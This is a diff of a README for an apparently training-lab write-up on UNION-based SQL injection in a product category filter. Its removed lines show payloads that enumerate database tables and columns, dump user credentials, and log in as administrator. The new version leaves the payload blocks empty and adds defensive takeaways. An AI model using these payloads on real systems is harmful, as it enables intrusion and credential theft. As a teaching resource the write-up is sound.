@@ -1,82 +1,72 @@
-# Lab: SQL injection attack, listing the database contents on non-Oracle databases
+# 💉 SQL Injection: Listing DB Contents on Non-Oracle Databases
 
-This lab demonstrates how to use SQL injection to enumerate and extract sensitive data such as table names, column names, and user credentials from a non-Oracle database using `UNION SELECT` injection.
+This lab demonstrates a **UNION-based SQL injection** vulnerability in the product category filter of a web application. The attack allows retrieving **table names, column names**, and ultimately **user credentials**, by exploiting the `category` parameter.
 
 ---
 
 ## 🧪 Step 1: Access the Lab
 
-Navigate to the lab URL and inspect the filter categories.
-
-📸 ![Step 1 - Access the Lab](./6-steps/1-access-lab.png)
-
----
-
-## 🔍 Step 2: Determine Column Count and Text Columns
-
-Intercept the request to the `/filter` endpoint using Burp Suite, and send it to **Repeater**. Modify the `category` parameter to:
-
-```sql
-Gifts' UNION SELECT 'abc','def'-- 
-```
-
-📸 ![Step 2 - Column Test](./6-steps/2-column-test.png)
-
-This confirms that there are two columns and both accept string values.
+📸  
+![Access the lab](1-access-lab.png)
 
 ---
 
-## 🧱 Step 3: Enumerate Table Names
+## 🔍 Step 2: Intercept and Identify the Vulnerable Request
 
-Now try to fetch table names using the following payload:
+We intercepted the request responsible for setting the category filter via Burp Suite.
 
-```sql
-Gifts' UNION SELECT table_name,NULL FROM information_schema.tables--
-```
-
-📸 ![Step 3 - Table Names](./6-steps/3-table-names.png)
-
-From the response, identify the table likely storing credentials, e.g., `users_refclt`.
+📸  
+![Intercepted category request](2-intercepted-category-request.png)
 
 ---
 
-## 🧬 Step 4: Enumerate Column Names
+## 🧱 Step 3: Column Count & Text Detection
 
-Use the following payload to enumerate columns in the `users_refclt` table:
+We tested how many columns were returned and identified the ones accepting string values.
 
-```sql
-Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_refclt'--
-```
+**Payload:**
 
-📸 ![Step 4 - Column Names](./6-steps/4-column-names.png)
-
-Look for columns like `username_vonhqo` and `password_fshwfp`.
+📸  
+![Column count test](3-column-count-test.png)
 
 ---
 
-## 📥 Step 5: Extract User Credentials
+## 📋 Step 4: Retrieve Column Names from Users Table
 
-Extract the user credentials using this payload:
+We first found a suspicious table named `users_refclt` by querying:
 
-```sql
-Gifts' UNION SELECT username_vonhqo,password_fshwfp FROM users_refclt--
-```
 
-📸 ![Step 5 - Extracted Credentials](./6-steps/5-dumped-credentials.png)
+Then extracted the column names using:
 
-Find the `administrator` user and the corresponding password (e.g., `egby7m3v5p3z3q4vhnfo`).
 
----
-
-## 🔐 Step 6: Login as Administrator
-
-Visit `/login` and use the extracted credentials:
-
-- **Username:** `administrator`
-- **Password:** `egby7m3v5p3z3q4vhnfo`
-
-📸 ![Step 6 - Lab Solved](./6-steps/6-lab-solved.png)
+📸  
+![Column names](4-column-names.png)
 
 ---
 
-✅ **Lab successfully solved!**
+## 👤 Step 5: Extract User Credentials
+
+After identifying the column names `username_vonhqo` and `password_fshwfp`, we dumped the user list:
+
+
+📸  
+![Usernames and passwords](5-user-pass-list.png)
+
+---
+
+## ✅ Step 6: Lab Solved
+
+We logged in using the retrieved administrator credentials and solved the lab.
+
+📸  
+![Lab solved](6-lab-solved.png)
+
+---
+
+### 🧠 Key Takeaways
+
+- Never directly include unvalidated user input in SQL queries.
+- Always use parameterised queries or stored procedures.
+- Regularly audit applications for injection points.
+
+---
